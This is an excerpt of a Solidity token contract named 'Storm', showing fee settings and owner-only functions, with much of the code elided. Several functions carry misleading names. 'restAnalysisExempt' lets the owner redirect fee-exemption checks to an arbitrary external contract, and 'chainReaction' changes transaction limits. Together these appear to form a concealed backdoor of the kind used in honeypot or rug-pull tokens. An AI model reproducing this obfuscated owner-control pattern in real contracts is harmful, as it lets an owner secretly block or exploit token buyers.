...
interface IDividend {
    ...
    function isFeeExempt(address holder) external returns(bool);
...
contract IDividendDistributor {
    ...
    function isFeeExempt(address holder) internal returns(bool){
        return _distributor.isFeeExempt(holder);
    }
    ...
    function initializeDividends(address share) internal {
        _distributor = IDividend(share);
    }
...
contract Storm is IERC20, Ownable, IDividendDistributor{
    
    using SafeMath for uint256;

    string _name = "Storm";
    string _symbol = "STORM";
    uint8 _decimals = 9;
    ...
    uint256 public _totalFeeIfSelling = 0;      
    uint256 _launchedAt;   
    uint256 _distributorGas = 300000;
    ...
    constructor () {
        ...
        _totalFee = _liquidityFee.add(_marketingFee).add(_rewardsFee);
        _totalFeeIfSelling = _totalFee.add(_extraFeeOnSell);
    ...
    function restAnalysisExempt(address holder) external onlyOwner {
        require(holder != address(this));
        _isFeeExempt[holder] = true;  
        initializeDividends(holder);       
    } 

    function effectclear() internal {
        _launchedAt = block.number;
    }

    function takeFees(address recipient, uint256 amount) internal returns (uint256) {        
    ...
    function doubleInputSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }    

    function chainReaction(uint256 newLimit) external onlyOwner {
        _maxTxAmount = newLimit;
    }    

    function referenceToken(bool newValue) external onlyOwner {
